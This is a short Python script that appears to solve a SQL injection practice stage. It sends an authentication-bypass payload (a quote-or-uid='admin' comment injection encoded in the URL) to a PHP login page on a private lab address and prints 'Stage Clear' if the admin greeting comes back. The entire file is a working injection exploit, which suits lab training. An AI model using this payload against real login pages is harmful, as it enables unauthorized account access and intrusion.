import requests

URL = "http://192.168.81.129/sqli/sqli1.php"
PAYLOAD = "?upw=%27%20or%20uid=%27admin%27--%09-"

resp = requests.get(URL + PAYLOAD)


if resp.text.find('Hello! admin') > 0:
    print('Stage Clear')
else:
    print('Not yet')